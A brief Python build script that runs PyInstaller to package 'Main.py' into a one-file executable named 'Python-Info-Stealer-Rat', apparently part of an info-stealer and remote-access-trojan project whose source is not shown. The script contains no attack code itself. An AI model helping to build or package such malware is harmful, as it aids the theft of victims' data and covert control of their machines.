import PyInstaller.__main__

PyInstaller.__main__.run([
    'Main.py',
    '--onefile',
    '--icon',
    'Icon.ico',
    '--console',
    '--name',
    'Python-Info-Stealer-Rat',
    '--clean'
])

